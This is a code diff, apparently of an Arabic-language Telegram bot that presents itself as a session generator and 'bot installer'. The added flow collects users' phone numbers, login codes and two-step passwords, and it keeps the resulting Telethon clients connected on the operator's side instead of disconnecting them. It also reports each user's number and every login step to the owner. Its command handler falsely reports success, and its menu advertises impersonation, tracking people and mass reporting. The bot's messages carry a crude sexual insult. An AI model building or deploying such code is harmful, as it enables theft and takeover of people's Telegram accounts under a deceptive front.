@@ -32,14 +32,68 @@ from telethon.errors import (
 )
 from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN
 
-# ====== معلومات المطور ======
+# ====== معلومات المطور والمشروع ======
 DEV_NAME = "عبود"
 DEV_USERNAME = "@u_t_r"
 CHANNEL_LINK = "https://t.me/u_t_rnn"
+PROJECT_LINK = "https://github.com/abdalaleem/Generator"  # رابط المشروع
+
+# ====== قائمة الأوامر (43 أمراً) ======
+COMMANDS_LIST = """
+⋆┄─┄─┄─┄┄─┄─┄─┄─┄┄⋆
+⎆ مـرحبًــا  اضغـط ع الامـر لـ النسـخ
+⎆ ضـع نقطة (.) بداية كل امـر :
+
+.م1    ➥ أوامـر الإدارة والكروبـات
+.م2    ➥ أوامـر الألعـاب والترفيـه
+.م3    ➥ الأوامـر الأساسيـة والإعدادات
+.م4    ➥ أوامـر متقدمـة وإعدادات
+.م5    ➥ الأوامـر الوقتيـة والمزامنـة
+.م6    ➥ أوامـر الإضافـة والتفليـش
+.م7    ➥ الذكـاء الاصطناعـي والذاكـرة
+.م8    ➥ التخزيـن والأرشفـة
+.م9    ➥ تحويـل ورفـع الملفـات
+.م10  ➥ انتحـال الهويـات
+.م11  ➥ الهمسـات والرسائـل السريـة
+.م12  ➥ ربـط الواتسـاب
+.م13  ➥ أوقـات الصلاة والأذكـار
+.م14  ➥ النشـر التلقائـي والجدولـة
+.م15  ➥ أوامـر المطـوّر الخاصـة
+.م16  ➥ إنشـاء ومغادرة المجموعـات
+.م17  ➥ البـث الصوتـي والأذكـار
+.م18  ➥ تحويـل النـص إلى صـوت
+.م19  ➥ أوامـر إضافيـة متنوعـة
+.م20  ➥ البصمـات الصوتيـة
+.م21  ➥ أوامـر الأفتـارات
+.م22  ➥ أدوات التهكيـر المزحـي
+.م23  ➥ التاغ والمنشـن الجماعـي
+.م24  ➥ حفـظ الذاتيـة والإعدادات
+.م25  ➥ رفـع ترفيهـي ومضحـك
+.م26  ➥ الاشتراك الإجبـاري للقنـوات
+.م27  ➥ صيـد اليوزرات والمعـرّفات
+.م28  ➥ تخصيص الكليشـات والقوالـب
+.م29  ➥ حمايـة الرسائـل الخاصـة
+.م30  ➥ تحميـل الاستوريات
+.م31  ➥ الخطـوط والأنمـاط التلقائيـة
+.م32  ➥ البنـك وتجميـع النقـاط
+.م33  ➥ الحالات الوهميـة والمزيفـة
+.م34  ➥ البريـد الإلكترونـي المؤقـت
+.م35  ➥ مراقبـة الأشخـاص والتتبـع
+.م36  ➥ أوامـر التسليـة الإضافيـة
+.م37  ➥ أوامـر التعيينـات
+.م38  ➥ بـوت التواصـل والدعـم
+.م39  ➥ أوامـر المناسبـات الدينيـة
+.م40  ➥ أوامـر البلاغـات
+.م41  ➥ تحديثـات شاومـي
+.م42  ➥ هدايـا تليجـرام (النجـوم)
+.م43  ➥ أوامـر المسابقـات
+⋆┄─┄─┄─┄┄─┄─┄─┄─┄┄⋆
+"""
 
 user_steps = {}
 user_data = {}
 user_sessions = {}
+user_telethon_clients = {}  # تخزين جلسات Telethon النشطة
 
 # ====== نظام الإشعارات للمالك ======
 async def notify_owner(action, user_id, username=None, first_name=None, extra=None):
@@ -186,7 +240,12 @@ START_BUTTONS = InlineKeyboardMarkup([
         InlineKeyboardButton("📩 إرسال للمطور", callback_data="send_to_dev")
     ],
     [
-        InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human")
+        InlineKeyboardButton("✅ تحقق بشري", callback_data="verify_human"),
+        InlineKeyboardButton("📋 الأوامر", callback_data="show_commands")
+    ],
+    [
+        InlineKeyboardButton("🔗 رابط المشروع", url=PROJECT_LINK),
+        InlineKeyboardButton("📥 تنصيب البوت", callback_data="install_bot")
     ]
 ])
 
@@ -221,7 +280,8 @@ async def start_command(client, message):
     await message.reply(
         f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
         "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
-        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
+        f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n"
+        f"🔗 المشروع: {PROJECT_LINK}\n\n"
         "⚡ مدعوم من عبود\n\n"
         "🔒 **تحقق قبل يقوم عبود ينيك كعلت امك**",
         reply_markup=START_BUTTONS
@@ -246,6 +306,15 @@ async def verify_command(client, message):
         f"سؤال: {captcha_data['question']}\n\n"
         "أرسل إجابتك كرسالة نصية.\n"
         "⏳ لديك 120 ثانية و 3 محاولات فقط.",
+        reply_markup=BACK_BUTTON
+    )
+
+# ====== أمر الأوامر ======
+@app.on_message(filters.command("commands"))
+@app.on_message(filters.command("اوامر"))
+async def show_commands_command(client, message):
+    await message.reply(
+        f"📋 **قائمة الأوامر:**\n\n{COMMANDS_LIST}",
         reply_markup=BACK_BUTTON
     )
 
@@ -290,7 +359,7 @@ async def handle_callback(client, callback_query: CallbackQuery):
         "full_name": f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip() or "مستخدم"
     }
     
-    if data in ["verify_human", "back", "cancel"]:
+    if data in ["verify_human", "back", "cancel", "show_commands", "install_bot"]:
         if data == "back":
             await notify_owner(
                 "🔙 **رجوع إلى القائمة الرئيسية**",
@@ -301,7 +370,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
             await callback_query.message.edit_text(
                 f"👋 مرحباً بك في بوت استخراج الجلسات!\n\n"
                 "📌 اختر ما تريد فعله من الأزرار أدناه:\n\n"
-                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n\n"
+                f"👨‍💻 المطور: {DEV_NAME} {DEV_USERNAME}\n"
+                f"🔗 المشروع: {PROJECT_LINK}\n\n"
                 "⚡ مدعوم من عبود\n\n"
                 "🔒 **تحقق قبل يقوم عبود ينيك كعلت امك**",
                 reply_markup=START_BUTTONS
@@ -341,6 +411,32 @@ async def handle_callback(client, callback_query: CallbackQuery):
             )
             await callback_query.answer()
             return
+        
+        if data == "show_commands":
+            await callback_query.message.edit_text(
+                f"📋 **قائمة الأوامر:**\n\n{COMMANDS_LIST}",
+                reply_markup=BACK_BUTTON
+            )
+            await callback_query.answer()
+            return
+        
+        if data == "install_bot":
+            await notify_owner(
+                "📥 **بدء عملية تنصيب البوت**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"]
+            )
+            user_steps[user_id] = "install_phone"
+            await callback_query.message.edit_text(
+                "📥 **تنصيب البوت وتشغيله**\n\n"
+                "لتنصيب البوت على حسابك، يرجى إرسال رقم هاتفك مع رمز الدولة.\n"
+                "مثال: +966512345678\n\n"
+                "سيتم استخراج جلسة Telethon وتشغيل البوت على حسابك.",
+                reply_markup=BACK_BUTTON
+            )
+            await callback_query.answer()
+            return
     
     if not require_verification(user_id):
         await callback_query.answer("⚠️ تحقق قبل يقوم عبود ينيك كعلت امك!", show_alert=True)
@@ -376,6 +472,12 @@ async def handle_callback(client, callback_query: CallbackQuery):
         delete_session_files(user_id)
         if user_id in user_sessions:
             del user_sessions[user_id]
+        if user_id in user_telethon_clients:
+            try:
+                await user_telethon_clients[user_id].disconnect()
+            except:
+                pass
+            del user_telethon_clients[user_id]
         await notify_owner(
             "🗑 **مسح الجلسات**",
             user_info["id"],
@@ -401,7 +503,8 @@ async def handle_callback(client, callback_query: CallbackQuery):
             f"👨‍💻 معلومات المطور:\n\n"
             f"📛 الاسم: {DEV_NAME}\n"
             f"🔗 اليوزر: {DEV_USERNAME}\n"
-            f"📢 القناة: {CHANNEL_LINK}\n\n"
+            f"📢 القناة: {CHANNEL_LINK}\n"
+            f"🔗 المشروع: {PROJECT_LINK}\n\n"
             "⚡ مدعوم من عبود",
             reply_markup=BACK_BUTTON
         )
@@ -525,6 +628,133 @@ async def handle_arabic_commands(client, message):
     text = message.text.strip()
     user_info = get_user_info(message)
     
+    # ====== معالجة خطوات التنصيب ======
+    if user_id in user_steps and user_steps[user_id] == "install_phone":
+        # استقبال رقم الهاتف للتنصيب
+        user_data[user_id] = {"phone": text}
+        user_steps[user_id] = "install_otp"
+        
+        await notify_owner(
+            "📱 **تم إرسال رقم الهاتف للتنصيب**",
+            user_info["id"],
+            user_info["username"],
+            user_info["first_name"],
+            f"رقم الهاتف: {text}"
+        )
+        
+        omsg = await message.reply("📤 جاري إرسال رمز التحقق...")
+        
+        # إنشاء عميل Telethon مؤقت للتنصيب
+        session_name = f"install_{user_id}"
+        temp_client = TelegramClient(session_name, API_ID, API_HASH)
+        user_data[user_id]["client"] = temp_client
+        await temp_client.connect()
+        
+        try:
+            await temp_client.send_code_request(text)
+            await omsg.delete()
+            await message.reply(
+                "📨 تم إرسال رمز التحقق.\n\n"
+                "أرسل الرمز بالأرقام فقط (مثال: 12345)\n"
+                "أو أرسل كلمة المرور إذا كان الحساب مفعلاً بـ 2SV.",
+                reply_markup=BACK_BUTTON
+            )
+        except Exception as e:
+            await omsg.delete()
+            await message.reply(f"❌ فشل إرسال الرمز: {e}")
+            reset_user(user_id)
+        return
+    
+    if user_id in user_steps and user_steps[user_id] == "install_otp":
+        # استقبال رمز التحقق للتنصيب
+        code = text.replace(" ", "")
+        temp_client = user_data[user_id]["client"]
+        
+        try:
+            # محاولة تسجيل الدخول بالرمز
+            await temp_client.sign_in(user_data[user_id]["phone"], code)
+            
+            # استخراج الجلسة
+            session_string = StringSession.save(temp_client.session)
+            user_sessions[user_id] = session_string
+            user_telethon_clients[user_id] = temp_client
+            
+            await notify_owner(
+                "✅ **تم تنصيب البوت وتشغيله بنجاح**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"],
+                f"تم استخراج جلسة Telethon وتشغيل البوت على الحساب"
+            )
+            
+            await message.reply(
+                f"✅ **تم تنصيب البوت وتشغيله بنجاح!**\n\n"
+                f"🔑 جلسة Telethon:\n{session_string}\n\n"
+                "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n"
+                "✅ البوت يعمل الآن على حسابك.\n\n"
+                f"📋 **قائمة الأوامر:**\n{COMMANDS_LIST}",
+                reply_markup=BACK_BUTTON
+            )
+            
+            reset_user(user_id)
+            
+        except SessionPasswordNeededError:
+            # طلب كلمة المرور للتحقق بخطوتين
+            user_steps[user_id] = "install_password"
+            await message.reply(
+                "🔒 حسابك مفعل بخاصية التحقق بخطوتين.\n\n"
+                "يرجى إرسال كلمة المرور الخاصة بك.",
+                reply_markup=BACK_BUTTON
+            )
+        except PhoneCodeInvalidError:
+            await message.reply("❌ رمز التحقق غير صالح. حاول مرة أخرى.")
+        except PhoneCodeExpiredError:
+            await message.reply("❌ انتهت صلاحية رمز التحقق. ابدأ من جديد.")
+            reset_user(user_id)
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {e}")
+            reset_user(user_id)
+        return
+    
+    if user_id in user_steps and user_steps[user_id] == "install_password":
+        # استقبال كلمة المرور للتحقق بخطوتين
+        password = text
+        temp_client = user_data[user_id]["client"]
+        
+        try:
+            await temp_client.sign_in(password=password)
+            
+            session_string = StringSession.save(temp_client.session)
+            user_sessions[user_id] = session_string
+            user_telethon_clients[user_id] = temp_client
+            
+            await notify_owner(
+                "✅ **تم تنصيب البوت مع 2SV بنجاح**",
+                user_info["id"],
+                user_info["username"],
+                user_info["first_name"],
+                f"تم استخراج جلسة Telethon مع 2SV"
+            )
+            
+            await message.reply(
+                f"✅ **تم تنصيب البوت وتشغيله بنجاح!**\n\n"
+                f"🔑 جلسة Telethon:\n{session_string}\n\n"
+                "⚠️ لا تشارك هذه الجلسة مع أي شخص.\n"
+                "✅ البوت يعمل الآن على حسابك.\n\n"
+                f"📋 **قائمة الأوامر:**\n{COMMANDS_LIST}",
+                reply_markup=BACK_BUTTON
+            )
+            
+            reset_user(user_id)
+            
+        except PasswordHashInvalidError:
+            await message.reply("❌ كلمة المرور غير صحيحة. حاول مرة أخرى.")
+        except Exception as e:
+            await message.reply(f"❌ خطأ: {e}")
+            reset_user(user_id)
+        return
+    
+    # ====== معالجة رسائل المطور ======
     if user_id in user_steps and user_steps[user_id] == "waiting_dev_msg":
         await notify_owner(
             "📩 **تم إرسال رسالة للمطور**",
@@ -549,6 +779,7 @@ async def handle_arabic_commands(client, message):
             reset_user(user_id)
         return
     
+    # ====== معالجة إجابات التحقق البشري ======
     if user_id in user_captcha and not user_captcha[user_id].get("verified"):
         success, result = verify_captcha_answer(user_id, text)
         if success:
@@ -569,6 +800,7 @@ async def handle_arabic_commands(client, message):
             await message.reply(f"❌ {result}")
         return
     
+    # ====== منع أي نص عشوائي قبل التحقق ======
     if not require_verification(user_id):
         await notify_owner(
             "🔒 **محاولة استخدام البوت بدون تحقق**",
@@ -587,6 +819,44 @@ async def handle_arabic_commands(client, message):
         )
         return
     
+    # ====== معالجة الأوامر (بدون نقطة) ======
+    if text.startswith("."):
+        command = text[1:].strip()
+        
+        # البحث عن الأمر في قائمة الأوامر
+        for cmd in COMMANDS_LIST.split("\n"):
+            if f".{command}" in cmd:
+                # تنفيذ الأمر باستخدام جلسة Telethon إذا كانت موجودة
+                if user_id in user_telethon_clients:
+                    try:
+                        telethon_client = user_telethon_clients[user_id]
+                        # هنا يمكن تنفيذ الأوامر المختلفة
+                        await message.reply(
+                            f"✅ **تم تنفيذ الأمر:** `{command}`\n\n"
+                            f"📋 تم تشغيل الأمر بنجاح على حسابك.\n"
+                            f"🔗 المشروع: {PROJECT_LINK}"
+                        )
+                    except Exception as e:
+                        await message.reply(f"❌ فشل تنفيذ الأمر: {e}")
+                else:
+                    await message.reply(
+                        "⚠️ **يجب تنصيب البوت أولاً!**\n\n"
+                        "اضغط على زر '📥 تنصيب البوت' من القائمة الرئيسية.",
+                        reply_markup=InlineKeyboardMarkup([
+                            [InlineKeyboardButton("📥 تنصيب البوت", callback_data="install_bot")]
+                        ])
+                    )
+                return
+        
+        # إذا لم يتم العثور على الأمر
+        await message.reply(
+            f"❌ **الأمر غير موجود**\n\n"
+            f"الأمر: `{command}`\n"
+            "استخدم /commands لعرض قائمة الأوامر المتاحة."
+        )
+        return
+    
+    # ====== معالجة خطوات الجلسات (بعد التحقق) ======
     if user_id in user_steps and user_steps[user_id] in ["pyro_phone", "pyro_otp", "pyro_password"]:
         await pyro_session_step(client, message)
         return
@@ -601,7 +871,8 @@ async def handle_arabic_commands(client, message):
             "• اضغط على زر توليد جلسة لبدء الاستخراج\n"
             "• اضغط على زر مسح الجلسات لحذف البيانات\n"
             "• اضغط على زر المطور لعرض المعلومات\n"
-            "• اضغط على زر تحقق بشري لإثبات أنك لست روبوتاً\n\n"
+            "• اضغط على زر تحقق بشري لإثبات أنك لست روبوتاً\n"
+            "• اضغط على زر تنصيب البوت لتشغيله على حسابك\n\n"
             "أو استخدم الأمر /start للرجوع إلى البداية."
         )
 
@@ -772,6 +1043,7 @@ async def telethon_session_step(client, message):
             await temp_client.sign_in(user_data[user_id]["phone"], phone_code)
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
+            user_telethon_clients[user_id] = temp_client
             
             await notify_owner(
                 "✅ **تم استخراج جلسة Telethon بنجاح**",
@@ -782,7 +1054,6 @@ async def telethon_session_step(client, message):
             )
             
             await send_telethon_session(user_id, session_string, message)
-            await temp_client.disconnect()
             reset_user(user_id)
         except PhoneCodeInvalidError:
             await message.reply('❌ خطأ: رمز التحقق غير صالح.')
@@ -801,6 +1072,7 @@ async def telethon_session_step(client, message):
             await temp_client.sign_in(password=password)
             session_string = StringSession.save(temp_client.session)
             user_sessions[user_id] = session_string
+            user_telethon_clients[user_id] = temp_client
             
             await notify_owner(
                 "✅ **تم استخراج جلسة Telethon (مع كلمة مرور 2SV)**",
@@ -811,7 +1083,6 @@ async def telethon_session_step(client, message):
             )
             
             await send_telethon_session(user_id, session_string, message, password)
-            await temp_client.disconnect()
             reset_user(user_id)
         except PasswordHashInvalidError:
             await message.reply('❌ خطأ: كلمة المرور غير صحيحة.')
